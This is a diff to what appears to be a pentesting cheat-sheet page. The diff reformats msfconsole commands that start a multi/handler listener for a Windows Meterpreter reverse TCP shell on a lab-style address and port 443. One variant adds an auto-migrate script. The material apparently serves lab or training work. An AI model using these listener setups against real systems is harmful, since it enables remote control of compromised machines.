@@ -9,11 +9,25 @@ tags: ["metasploit", "listener", "revshell", "msfconsole"]
 
 ```bash
 msfconsole -q
+```
 
+```bash
 use exploit/multi/handler
+```
+
+```bash
 set payload windows/meterpreter/reverse_tcp
+```
+
+```bash
 set lhost 10.10.14.10
+```
+
+```bash
 set lport 443
+```
+
+```bash
 run
 ```
 
@@ -30,12 +44,29 @@ run post/windows/manage/migrate
 
 ```bash
 msfconsole -q
+```
 
+```bash
 use exploit/multi/handler
+```
+
+```bash
 set payload windows/meterpreter/reverse_tcp
+```
+
+```bash
 set lhost 10.10.14.10
+```
+
+```bash
 set lport 443
+```
+
+```bash
 set AutoRunScript multi_console_command -r automigrate.rc
+```
+
+```bash
 run
 ```
 
